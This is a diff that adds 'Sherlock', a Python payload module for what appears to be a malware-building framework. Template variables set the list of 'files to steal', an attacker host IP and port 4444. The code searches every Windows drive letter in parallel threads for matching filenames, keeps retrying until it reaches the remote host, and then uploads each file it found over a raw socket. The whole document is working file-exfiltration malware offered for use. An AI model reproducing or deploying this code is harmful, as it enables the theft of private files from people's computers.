@@ -1,0 +1,82 @@
+#!name##Sherlock
+#!types##payload
+#!info##It looks for files with the specified name and uploads them to the server.
+#!import_FLAG##True
+#!render_FLAG##True
+#!reqVar##SHL_files##List of files to steal.##str
+#!setVar##SHL_files##[]##str
+#!reqFood##SHL_extra##FOOD_sherlock_files##Additional files to steal. You can add additional names to file 'sherlock_files' which is located in 'shortcuts' directory.
+#!reqVar##SHL_pause##Interval in seconds between file uploads.##int
+#!setVar##SHL_pause##1##int
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##SHL_port##Host port number##int
+#!setVar##SHL_port##4444##int
+
+
+import socket
+import os
+import threading
+import string
+from time import sleep
+
+
+class Sherlock:
+    def __init__(self):
+        self.base = {{SHL_files}}
+        self.base.extend({{SHL_extra}}) 
+        self.find = []
+        self.lock = threading.Lock()
+        self.diskl = string.ascii_lowercase
+        self.base_dir = [f"{l}:/" for l in self.diskl if os.path.exists(f"{l}:/")]
+
+    def _searching(self, bdirs):
+        if not os.path.exists(bdirs):
+            return
+        for root, dirs, files in os.walk(bdirs):
+            for f in files:
+                if os.path.basename(f) in self.base:
+                    self.get_loot(os.path.join(root, f))
+
+    def searching(self):
+        ls = []
+        for bd in self.base_dir:
+            l = threading.Thread(target=self._searching, args=(bd, ))
+            ls.append(l)
+            l.start()
+        for l in ls:
+            l.join()
+        self.send()
+
+    
+    def get_loot(self, fpath):
+        with self.lock:
+            self.find.append(fpath)
+    
+    def send(self):
+        while True:
+            if not self._connect():
+                sleep(3)
+            else:
+                break
+        
+        for fi in self.find:
+            try:
+                with open(fi, "rb") as f:
+                    self.sock.sendfile(f, 0)
+                sleep({{SHL_pause}})
+            except:
+                continue
+
+    def _connect(self):
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.connect(("{{IP_ADDR}}", {{SHL_port}}))
+            return True
+        except:
+            return False
+    
+    def start(self):
+        self.searching()
+
+sh = Sherlock()
+sh.start()
